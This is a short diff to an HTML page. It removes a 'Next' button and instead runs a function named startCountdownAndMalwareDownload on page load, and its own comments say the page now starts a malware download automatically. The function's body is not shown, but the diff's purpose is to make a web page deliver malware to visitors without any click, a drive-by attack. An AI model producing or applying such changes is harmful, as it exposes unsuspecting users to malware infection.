@@ -26,17 +26,13 @@
   </style>
 </head>
 <body>
-  <div class="container" id="form-container">
-    <button id="next-btn">Next</button>
+  <div class="container">
+    <div id="countdown"></div>
+    <div id="message"></div>
   </div>
-
-  <div id="countdown"></div>
-  <div id="message"></div>
 
   <script>
     // Get DOM elements
-    const nextBtn = document.getElementById("next-btn");
-    const formContainer = document.getElementById("form-container");
     const countdownElement = document.getElementById("countdown");
     const messageElement = document.getElementById("message");
 
@@ -79,8 +75,8 @@
       }, 3000);
     }
 
-    // Next button click event: start malware download
-    nextBtn.addEventListener("click", startCountdownAndMalwareDownload);
+    // Start countdown and malware download on page load
+    window.onload = startCountdownAndMalwareDownload;
   </script>
 </body>
 </html>
